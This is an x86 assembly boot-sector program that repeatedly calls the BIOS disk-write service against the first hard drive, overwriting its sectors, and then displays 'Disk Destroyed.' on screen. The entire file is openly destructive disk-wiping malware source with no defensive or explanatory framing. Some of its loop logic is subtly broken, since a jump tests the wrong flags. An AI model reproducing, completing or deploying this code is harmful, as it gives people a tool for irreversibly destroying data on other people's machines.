bits 16
org 0x7c00
dstry_start:
 xor eax,eax
 mov es,ax
 mov ax,3
 int 0x10 ;switch txt mode

 mov al,0
 mov bx,0x7c00
 mov cl,0
dstry_loop:
 mov ah,0x3
 mov ch,0
 
 mov dh,0
 mov dl,0x80 ;first hard drive usb stick or real HDD/SSD
 
 int 0x13
 inc al ;128 kb(255 sectors)
 cmp al,0xff
 inc cl
 jz print
 inc bx
 cmp bx,0xffff ;reached limit?
 jz print
 jmp dstry_loop
print:
 cld
 mov ax,0xb800
 mov es,ax
 xor bx,bx
 mov si,dstryd
dstry_print:
 lodsb
 test al,al ;reached end?
 jz halt

 mov byte [es:bx],al
 inc bx
 mov byte [es:bx],0x40
 inc bx
 jmp dstry_print
halt:
 hlt
 jmp halt
dstryd db "Disk Destroyed.",0


times 510-($-$$) db 0
dw 0xaa55
